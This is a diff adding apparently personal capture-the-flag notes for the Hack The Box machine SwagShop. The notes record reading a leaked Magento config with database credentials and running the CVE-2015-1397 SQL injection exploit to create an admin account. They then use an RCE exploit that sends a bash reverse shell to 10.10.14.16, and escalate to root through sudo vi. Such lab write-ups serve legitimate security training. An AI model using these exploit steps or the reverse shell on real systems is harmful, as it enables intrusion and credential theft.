@@ -1,0 +1,108 @@
+
+
+website is running Magento (2014)
+
+
+https://www.mgt-commerce.com/tutorial/magento-versions/
+
+http://swagshop.htb/app/code/core/
+
+version is 1.9 or 1.9.0.1
+got this from the writeup bc i dont want to get magescan
+
+http://swagshop.htb/app/etc/local.xml
+
+<config>
+<global>
+<install>
+<date>Wed, 08 May 2019 07:23:09 +0000</date>
+</install>
+<crypt>
+<key>b355a9e0cd018d3f7f03607141518419</key>
+</crypt>
+<disable_local_modules>false</disable_local_modules>
+<resources>
+<db>
+<table_prefix></table_prefix>
+</db>
+<default_setup>
+<connection>
+<host>localhost</host>
+<username>root</username>
+<password>fMVWh7bDHpgZkyfqQXreTjU9</password>
+<dbname>swagshop</dbname>
+<initStatements>SET NAMES utf8</initStatements>
+<model>mysql4</model>
+<type>pdo_mysql</type>
+<pdoType></pdoType>
+<active>1</active>
+</connection>
+</default_setup>
+</resources>
+<session_save>files</session_save>
+</global>
+<admin>
+<routers>
+<adminhtml>
+<args>
+<frontName>admin</frontName>
+</args>
+</adminhtml>
+
+creds
+db : mysql4
+user : root
+pass : fMVWh7bDHpgZkyfqQXreTjU9
+
+
+CVE 2015-1397 "Magento Shoplift"
+https://raw.githubusercontent.com/joren485/Magento-Shoplift-SQLI/master/poc.py
+https://github.com/Hackhoven/Magento-RCE
+
+┌──(root㉿kali)-[/home/kali]
+└─# python2 swagshop_poc.py swagshop.htb
+WORKED
+Check http://swagshop.htb/admin with creds ypwq:123
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+now we look for RCE
+
+https://github.com/Hackhoven/Magento-RCE/blob/main/magento-rce-exploit.py
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 swagshop_rce.py http://swagshop.htb/index.php/admin/ "bash -c 'bash -i >& /dev/tcp/10.10.14.16/80 0>&1'"
+Form name: None
+Control name: form_key
+Control name: login[username]
+Control name: dummy
+Control name: login[password]
+Control name: None
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# sudo nc -lvnp 80 
+listening on [any] 80 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.140] 36664
+bash: cannot set terminal process group (1881): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@swagshop:/var/www/html$ id  
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+we can sudo run vim, a GTFO bin.
+https://gtfobins.github.io/gtfobins/vim/#sudo
+
+sudo /usr/bin/vi /var/www/html/php.ini.sample -c ':!/bin/bash'
+done.
+
+
+
+
+
+
+
+
